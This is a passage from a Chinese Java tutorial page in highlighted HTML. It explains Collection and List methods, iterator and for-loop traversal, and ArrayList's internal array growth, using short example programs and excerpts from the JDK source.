class="line">        list.remove(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">20</span>)); <span class="comment">//指定删除某个元素</span></span><br><span class="line">        System.out.println(<span class="string">&quot;list=&quot;</span>+list);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        3. contains：查找元素是否存在</span></span><br><span class="line">        System.out.println(list.contains(<span class="string">&quot;卡卡西&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        4. size：获取元素个数</span></span><br><span class="line">        System.out.println(list.size());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        5. isEmpty：判断是否为空</span></span><br><span class="line">        System.out.println(list.isEmpty());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        6. clear：清空</span></span><br><span class="line">        list.clear();</span><br><span class="line">        System.out.println(<span class="string">&quot;list=&quot;</span>+list);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        7. addAll：添加多个元素</span></span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        list2.add(<span class="string">&quot;鸣人&quot;</span>);</span><br><span class="line">        list2.add(<span class="string">&quot;佐助&quot;</span>);</span><br><span class="line">        list2.add(<span class="string">&quot;博人&quot;</span>);</span><br><span class="line"></span><br><span class="line">        list.addAll(list2);</span><br><span class="line">        System.out.println(<span class="string">&quot;list=&quot;</span>+list);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        8. containsAll：查找多个元素是否都存在</span></span><br><span class="line">        System.out.println(list.containsAll(list2));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        9. removeAll：删除多个元素</span></span><br><span class="line">        list.add(<span class="string">&quot;大蛇丸&quot;</span>);</span><br><span class="line">        list.removeAll(list2);</span><br><span class="line">        System.out.println(<span class="string">&quot;list=&quot;</span>+list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Iterator-迭代器-遍历元素"><a href="#Iterator-迭代器-遍历元素" class="headerlink" title="Iterator(迭代器)遍历元素"></a>Iterator(迭代器)遍历元素</h2><h3 id="Iterator基本介绍"><a href="#Iterator基本介绍" class="headerlink" title="Iterator基本介绍"></a>Iterator基本介绍</h3><ol><li>Iterator对象称为迭代器，主要用于遍历Collection集合中的元素。</li><li>所有实现了Collection接口的集合类都有一个iterator()方法，用以返回一个实现了Iterator接口的对象，即可以返回一个迭代器。</li><li>Iterator 的结构</li><li>Iterator 仅用于遍历集合，Iterator 本身并不存放对象。</li></ol><h3 id="Iterator迭代器执行原理"><a href="#Iterator迭代器执行原理" class="headerlink" title="Iterator迭代器执行原理"></a>Iterator迭代器执行原理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//得到一个集合的迭代器</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line"><span class="comment">//hasNext():判断是否还有下一个元素</span></span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">    <span class="comment">//next(): 返回迭代中的下一个元素</span></span><br><span class="line">    System.out.printIn(iterator.next());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Iterator接口方法"><a href="#Iterator接口方法" class="headerlink" title="Iterator接口方法"></a>Iterator接口方法</h3><table><thead><tr><th>返回类型</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>boolean</td><td>hasNext()</td><td>如果迭代具有更多元素，则返回 true</td></tr><tr><td>E</td><td>next()</td><td>返回迭代中的下一个元素</td></tr><tr><td>default&#x2F;void</td><td>remove()</td><td>从底层集合中删除此迭代器返回的最后一个元素（可选操作）</td></tr><tr><td>default&#x2F;void</td><td>forEachRemaining(Consumer action)</td><td>对每个剩余元素执行给定的操作，直到所有元素都被处理或动作引发异常</td></tr></tbody></table><p>注意：在调用it.next()方法之前必须调用it.hasNext()进行检测。若不调用，且下一条记录无效，直接调用it.next会抛出NoSuchElementException异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollectionIterator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Collection</span> <span class="variable">col</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        col.add(<span class="keyword">new</span> <span class="title class_">book</span>(<span class="string">&quot;三国演义&quot;</span>,<span class="string">&quot;罗贯中&quot;</span>,<span class="number">20.2</span>));</span><br><span class="line">        col.add(<span class="keyword">new</span> <span class="title class_">book</span>(<span class="string">&quot;红楼梦&quot;</span>,<span class="string">&quot;曹雪芹&quot;</span>,<span class="number">150.3</span>));</span><br><span class="line">        col.add(<span class="keyword">new</span> <span class="title class_">book</span>(<span class="string">&quot;小李飞刀&quot;</span>,<span class="string">&quot;古龙&quot;</span>,<span class="number">25.3</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(col);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        遍历集合</span></span><br><span class="line"><span class="comment">//        1. 得到集合对应的迭代器</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> col.iterator();</span><br><span class="line"><span class="comment">//        2. 使用while循环遍历</span></span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext())&#123; <span class="comment">//判断是否还有数据</span></span><br><span class="line">            <span class="comment">// 返回下一个元素，类型是Object</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;onject=&quot;</span>+object);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        提示： 快速生成while循环快捷键 =&gt; itit</span></span><br><span class="line"><span class="comment">//        显示快捷提示键  =&gt; ctrl+J</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">book</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String author;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">book</span><span class="params">(String name, String author, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.author = author;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAuthor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> author;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAuthor</span><span class="params">(String author)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.author = author;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;book&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, author=&#x27;&quot;</span> + author + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, price=&quot;</span> + price +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="增强-for-循环遍历集合元素"><a href="#增强-for-循环遍历集合元素" class="headerlink" title="增强 for 循环遍历集合元素"></a>增强 for 循环遍历集合元素</h3><p>增强for循环，可以替代iterator迭代器，特点：增强for就是简化版的iterator，本质一样。只能用于遍历集合或数组。</p><p>基本语法</p><p>for(元素类型 元素名 : 集合名或数组名){<br>    访问元素<br>}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollectionFor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">col</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        col.add(<span class="keyword">new</span> <span class="title class_">book</span>(<span class="string">&quot;三国演义&quot;</span>,<span class="string">&quot;罗贯中&quot;</span>,<span class="number">20.2</span>));</span><br><span class="line">        col.add(<span class="keyword">new</span> <span class="title class_">book</span>(<span class="string">&quot;红楼梦&quot;</span>,<span class="string">&quot;曹雪芹&quot;</span>,<span class="number">150.3</span>));</span><br><span class="line">        col.add(<span class="keyword">new</span> <span class="title class_">book</span>(<span class="string">&quot;小李飞刀&quot;</span>,<span class="string">&quot;古龙&quot;</span>,<span class="number">25.3</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(col);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        使用增强for循环遍历</span></span><br><span class="line"><span class="comment">//        增强for循环底层依然是迭代器</span></span><br><span class="line"><span class="comment">//        提示：快捷键 =&gt;  col.for</span></span><br><span class="line">        <span class="keyword">for</span>(Object book : col)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;book=&quot;</span>+book);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        增强for也可以用在数组上</span></span><br><span class="line">        <span class="type">int</span>[] nums = &#123;<span class="number">1</span>,<span class="number">25</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;i=&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="List-接口和常用方法"><a href="#List-接口和常用方法" class="headerlink" title="List 接口和常用方法"></a>List 接口和常用方法</h2><h3 id="List-接口基本介绍"><a href="#List-接口基本介绍" class="headerlink" title="List 接口基本介绍"></a>List 接口基本介绍</h3><p>List接口是 Collection 接口的子接口</p><ol><li>List集合类中元素有序（即添加顺序和取出顺序一致）、且可重复。</li><li>List集合中的每个元素都有其对应的顺序索引，即支持索引。</li><li>List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素。</li><li>List接口常用的实现类有：ArrayList、LinkedList 和 Vector。</li></ol><h3 id="List-接口常用方法"><a href="#List-接口常用方法" class="headerlink" title="List 接口常用方法"></a>List 接口常用方法</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>void add ( int index , Object ele)</td><td>在index位置插入ele元素</td></tr><tr><td>boolean addAll ( int index , Collection eles)</td><td>从index位置开始将eles中的所有元素添加进来</td></tr><tr><td>Object get ( int index )</td><td>获取指定index位置的元素</td></tr><tr><td>int indexOf ( Object obj)</td><td>返回obj在集合中首次出现的位置</td></tr><tr><td>int lastIndexOf ( Object obj)</td><td>返回obj在当前集合中末次出现的位置</td></tr><tr><td>Object remove ( int index)</td><td>移除指定index位置的元素，并返回此元素</td></tr><tr><td>Object set ( int index , Object ele)</td><td>设置指定index位置的元素为ele，相当于是替换</td></tr><tr><td>List subList ( int fromeIndex , int toIndex)</td><td>返回从fromIndex 到 toIndex 位置的子集合</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        list.add(<span class="string">&quot;卡卡西&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;鸣人&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        void add (int index,Object ele)在index位置插入ele元素</span></span><br><span class="line">        list.add(<span class="number">1</span>,<span class="string">&quot;佐助&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        boolean addAll(int index,Collection eles)从index位置开始将eles中的所有元素添加进来</span></span><br><span class="line">        <span class="type">List</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        list2.add(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">        list2.add(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line"></span><br><span class="line">        list.addAll(<span class="number">1</span>,list2);</span><br><span class="line">        System.out.println(list);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object get(int index)获取指定index位置的元素</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(<span class="number">1</span>);</span><br><span class="line">        System.out.println(o);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        int indexOf(Object obj)返回obj在集合中首次出现的位置</span></span><br><span class="line">        System.out.println(list.indexOf(<span class="string">&quot;tom&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        int lastIndexOf(Object obj)返回obj在当前集合中末次出现的位置</span></span><br><span class="line">        list.add(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">        System.out.println(list.lastIndexOf(<span class="string">&quot;jack&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object remove(int index)移除指定index位置的元素，并返回此元素</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">remove</span> <span class="operator">=</span> list.remove(<span class="number">5</span>);</span><br><span class="line">        System.out.println(remove);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object set(int index,Object ele)设置指定index位置的元素为ele，相当于是替换</span></span><br><span class="line">        list.set(<span class="number">1</span>,<span class="string">&quot;mary&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        List subList(int fromeIndex,int toIndex)返回从fromIndex 到 toIndex 位置的子集合</span></span><br><span class="line"><span class="comment">//        子集合范围为前闭后开   fromeIndex &lt;= subList  &lt;  toIndex</span></span><br><span class="line">        <span class="type">List</span> <span class="variable">subList</span> <span class="operator">=</span> list.subList(<span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">        System.out.println(subList);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="List的三种遍历方式"><a href="#List的三种遍历方式" class="headerlink" title="List的三种遍历方式"></a>List的三种遍历方式</h3><ol><li>使用iterator</li><li>使用增强for</li><li>使用普通for</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListFor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        list.add(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;卡卡西&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;博人&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        遍历</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=======迭代器遍历&quot;</span>);</span><br><span class="line"><span class="comment">//        1. 迭代器</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> list.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>  iterator.next();</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;=======增强for循环&quot;</span>);</span><br><span class="line"><span class="comment">//      2.  增强for循环</span></span><br><span class="line">        <span class="keyword">for</span> (Object o : list) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;o=&quot;</span>+o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;=======普通for循环&quot;</span>);</span><br><span class="line"><span class="comment">//        3. 普通for循环</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;对象=&quot;</span>+list.get(i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ArrayList-底层结构和源码分析"><a href="#ArrayList-底层结构和源码分析" class="headerlink" title="ArrayList 底层结构和源码分析"></a>ArrayList 底层结构和源码分析</h2><h3 id="ArrayList-注意事项"><a href="#ArrayList-注意事项" class="headerlink" title="ArrayList 注意事项"></a>ArrayList 注意事项</h3><ol><li>ArrayList 可以加入null，并且多个</li><li>ArrayList是由数组来实现的</li><li>ArrayList基本等同于Vector，除了 ArrayList是线程不安全（执行效率高），在多线程情况下，不建议使用ArrrayList。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ArrayList 是线程不安全，源码 没有 synchronized</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">        elementData[size++] = e;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="ArrayList-的底层扩容机制源码分析（重点，难点）"><a href="#ArrayList-的底层扩容机制源码分析（重点，难点）" class="headerlink" title="ArrayList 的底层扩容机制源码分析（重点，难点）"></a>ArrayList 的底层扩容机制源码分析（重点，难点）</h3><ol><li>ArrayList 中维护了一个 Object类型的数组 elementData。</li><li>transient Object[] elementData; &#x2F;&#x2F; transient 标识瞬间，短暂的，表示该属性不会被序列化</li><li>当创建ArrayList对象时，如果使用的是无参构造器，则初始elementData 容量为0，第一次添加，则扩容elementData为10，如需再次扩容，则扩容elementData为1.5倍。</li><li>如果使用的是指定大小的构造器，则初始elementData容量为指定大小，如果需要扩容，则直接扩容elementData为1.5倍。</li></ol><p>源程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭警告</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;all&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayListSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        使用无参构造器创建ArrayList对象</span></span><br><span class="line"><span class="comment">//        在此处添加断点</span></span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        使用for循环给list集合添加 1-10 数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">            list.add(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        使用for循环给list集合添加 11-15 数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">11</span>; i&lt;=<span class="number">15</span>;i++)&#123;</span><br><span class="line">            list.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(<span class="number">100</span>);</span><br><span class="line">        list.add(<span class="number">200</span>);</span><br><span class="line">        list.add(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object o : list) &#123;</span><br><span class="line">            System.out.println(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>debug – step Into 到 ArrayList.java的ArrarList()构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs an empty list with an initial capacity of ten.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ArrayList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查询DEFAULTCAPACITY_EMPTY_ELEMENTDATA可发现 默认为空数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Shared empty array instance used for default sized empty instances. We</span></span><br><span class="line"><span class="comment">     * distinguish this from EMPTY_ELEMENTDATA to know how much to inflate when</span></span><br><span class="line"><span class="comment">     * first element is added.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br></pre></td></tr></table></figure><p>第一次for循环，程序先进入Integer valueOf() 方法对数据进行装箱</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Integer <span class="title function_">valueOf</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span><br><span class="line">            <span class="keyword">return</span> IntegerCache.cache[i + (-IntegerCache.low)];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(i);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后执行 list 的boolean add(E e)方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Appends the specified element to the end of this list.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> e element to be appended to this list</span></span><br><span class="line"><span class="comment">     * <span 